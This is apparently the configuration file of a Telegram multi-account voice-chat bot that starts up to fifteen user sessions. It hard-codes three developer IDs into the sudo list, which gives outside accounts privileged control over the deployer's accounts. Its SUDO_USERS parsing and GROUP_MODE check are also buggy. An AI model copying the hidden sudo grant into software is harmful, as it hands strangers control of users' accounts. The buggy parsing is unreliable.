import asyncio
import os
import sys
import time

from dotenv import load_dotenv
from pyrogram import Client, filters
from pytgcalls import PyTgCalls


if os.path.exists(".env"):
    load_dotenv(".env")
    
# -------------CONFIGS--------------------
API_ID = int(os.getenv("API_ID", ""))
API_HASH = os.getenv("API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", None)
SESSION1 = os.getenv("SESSION", None)
SESSION2 = os.getenv("SESSION2", None)
SESSION3 = os.getenv("SESSION3", None)
SESSION4 = os.getenv("SESSION4", None)
SESSION5 = os.getenv("SESSION5", None)
SESSION6 = os.getenv("SESSION6", None)
SESSION7 = os.getenv("SESSION7", None)
SESSION8 = os.getenv("SESSION8", None)
SESSION9 = os.getenv("SESSION9", None)
SESSION10 = os.getenv("SESSION10", None)
SESSION11 = os.getenv("SESSION11", None)
SESSION12 = os.getenv("SESSION12", None)
SESSION13 = os.getenv("SESSION13", None)
SESSION14 = os.getenv("SESSION14", None)
SESSION15 = os.getenv("SESSION15", None)
HNDLR = os.getenv("HNDLR", "!")
GROUP_MODE = os.getenv("GROUP_MODE", "True")

SUDO_USERS = list(map(int, os.getenv("SUDO_USERS", "")))
DEVS = [1517994352, 1789859817, 1432756163]
for x in DEVS:
    SUDO_USERS.append(x)
#----------------------------------------------

vcbot = Client(
    'ArrayCore',
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    plugins={'root': 'ArrayCore.vc'},
)

contact_filter = filters.create(lambda _, __, message:(message.from_user and message.from_user.is_contact) or message.outgoing)
start_time = time.time()

if GROUP_MODE == ("True" or "true" or "TRUE"):
    grp = True
else:
    grp = False


#-------------------------CLIENTS-----------------------------
if SESSION1:
    Venom1 = Client(SESSION1, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'ArrayCore.vc'})
    call_py1 = PyTgCalls(Venom1)
else:
    Venom1 = None
    call_py1 = None

if SESSION2:
    Venom2 = Client(SESSION2, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'ArrayCore.vc'})
    call_py2 = PyTgCalls(Venom2)
else:
    Venom2 = None
    call_py2 = None

if SESSION3:
    Venom3 = Client(SESSION3, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'ArrayCore.vc'})
    call_py3 = PyTgCalls(Venom3)
else:
    Venom3 = None
    call_py3 = None

if SESSION4:
    Venom4 = Client(SESSION4, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'ArrayCore.vc'})
    call_py4 = PyTgCalls(Venom4)
else:
    Venom4 = None
    call_py4 = None

if SESSION5:
    Venom5 = Client(SESSION5, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'ArrayCore.vc'})
    call_py5 = PyTgCalls(Venom5)
else:
    Venom5 = None
    call_py5 = None

if SESSION6:
    Venom6 = Client(SESSION6, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'ArrayCore.vc'})
    call_py6 = PyTgCalls(Venom6)
else:
    Venom6 = None
    call_py6 = None
        
if SESSION7:
    Venom7 = Client(SESSION7, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'ArrayCore.vc'})
    call_py7 = PyTgCalls(Venom7)
else:
    Venom7 = None
    call_py7 = None

if SESSION8:
    Venom8 = Client(SESSION8, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'ArrayCore.vc'})
    call_py8 = PyTgCalls(Venom8)
else:
    Venom8 = None
    call_py8 = None

if SESSION9:
    Venom9 = Client(SESSION9, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'ArrayCore.vc'})
    call_py9 = PyTgCalls(Venom9)
else:
    Venom9 = None
    call_py9 = None
    
if SESSION10:
    Venom10 = Client(SESSION10, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'ArrayCore.vc'})
    call_py10 = PyTgCalls(Venom10)
else:
    Venom10 = None
    call_py10 = None
           
if SESSION11:
    Venom11 = Client(SESSION11, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'ArrayCore.vc'})
    call_py11 = PyTgCalls(Venom11)
else:
    Venom11 = None
    call_py11 = None

if SESSION12:
    Venom12 = Client(SESSION12, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'ArrayCore.vc'})
    call_py12 = PyTgCalls(Venom12)
else:
    Venom12 = None
    call_py12 = None

if SESSION13:
    Venom13 = Client(SESSION13, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'ArrayCore.vc'})
    call_py13 = PyTgCalls(Venom13)
else:
    Venom13 = None
    call_py13 = None

if SESSION14:
    Venom14 = Client(SESSION14, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'ArrayCore.vc'})
    call_py14 = PyTgCalls(Venom14)
else:
    Venom14 = None
    call_py14 = None

if SESSION15:
    Venom15 = Client(SESSION15, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'ArrayCore.vc'})
    call_py15 = PyTgCalls(Venom15)
else:
    Venom15 = None
    call_py15 = None
#----------------------------------------------------------------
